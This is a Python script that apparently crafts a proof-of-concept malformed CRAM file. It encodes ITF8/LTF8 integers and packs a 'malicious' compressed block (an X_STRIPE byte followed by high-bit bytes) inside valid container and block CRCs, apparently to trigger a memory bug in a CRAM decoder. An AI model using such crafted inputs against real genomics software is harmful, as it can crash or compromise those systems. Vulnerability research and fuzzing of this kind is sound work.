import zlib, struct

def itf8_put(val):
    if not (val & ~0x7f):
        return bytes([val])
    elif not (val & ~0x3fff):
        return bytes([(val>>8)|0x80, val&0xff])
    elif not (val & ~0x1fffff):
        return bytes([(val>>16)|0xc0, (val>>8)&0xff, val&0xff])
    elif not (val & ~0x0fffffff):
        return bytes([(val>>24)|0xe0, (val>>16)&0xff, (val>>8)&0xff, val&0xff])
    else:
        return bytes([0xf0|((val>>28)&0xff), (val>>20)&0xff, (val>>12)&0xff, (val>>4)&0xff, val&0x0f])

def ltf8_put(val):
    if not (val & ~0x7f):
        return bytes([val])
    elif not (val & ~0x3fff):
        return bytes([(val>>8)|0x80, val&0xff])
    elif not (val & ~0x1fffff):
        return bytes([(val>>16)|0xc0, (val>>8)&0xff, val&0xff])
    elif not (val & ~0x0fffffff):
        return bytes([(val>>24)|0xe0, (val>>16)&0xff, (val>>8)&0xff, val&0xff])
    elif not (val & ~0x7fffffff):
        return bytes([(val>>32)|0xf0, (val>>24)&0xff, (val>>16)&0xff, (val>>8)&0xff, val&0xff])
    elif not (val & ~0x3ffffffffff):
        return bytes([(val>>40)|0xf8, (val>>32)&0xff, (val>>24)&0xff, (val>>16)&0xff, (val>>8)&0xff, val&0xff])
    elif not (val & ~0x1ffffffffffff):
        return bytes([(val>>48)|0xfc, (val>>40)&0xff, (val>>32)&0xff, (val>>24)&0xff, (val>>16)&0xff, (val>>8)&0xff, val&0xff])
    elif not (val & ~0xffffffffffffff):
        return bytes([(val>>56)|0xfe, (val>>48)&0xff, (val>>40)&0xff, (val>>32)&0xff, (val>>24)&0xff, (val>>16)&0xff, (val>>8)&0xff, val&0xff])
    else:
        return bytes([0xff, (val>>56)&0xff, (val>>48)&0xff, (val>>40)&0xff, (val>>32)&0xff, (val>>24)&0xff, (val>>16)&0xff, (val>>8)&0xff, val&0xff])

# malicious compressed data
# byte0 = 0x08 (X_STRIPE), rest all 0x80 (high bit set)
n = 8
mal = bytes([0x08]) + bytes([0x80])*n
comp_size = len(mal)
uncomp_size = 100  # arbitrary

# block header
bh = bytes([6, 0]) + itf8_put(0) + itf8_put(comp_size) + itf8_put(uncomp_size)
block_crc = zlib.crc32(bh, 0) & 0xffffffff
block_crc = zlib.crc32(mal, block_crc) & 0xffffffff
block = bh + mal + struct.pack('<I', block_crc)

# container body length = len(block)
body_len = len(block)

# container header
ch = struct.pack('<I', body_len)
ch += itf8_put(0)  # ref_seq_id
ch += itf8_put(0)  # ref_seq_start
ch += itf8_put(0)  # ref_seq_span
ch += itf8_put(0)  # num_records
ch += ltf8_put(0)  # record_counter
ch += ltf8_put(0)  # num_bases
ch += itf8_put(1)  # num_blocks
ch += itf8_put(1)  # num_landmarks
ch += itf8_put(0)  # landmark[0]
container_crc = zlib.crc32(ch, 0) & 0xffffffff
ch += struct.pack('<I', container_crc)

# file def
filedef = b'CRAM' + bytes([3,0]) + bytes(20)

poc = filedef + ch + block
open('/tmp/poc.cram','wb').write(poc)
print('poc size', len(poc))
print('body_len', body_len)
print('mal', mal.hex())
"

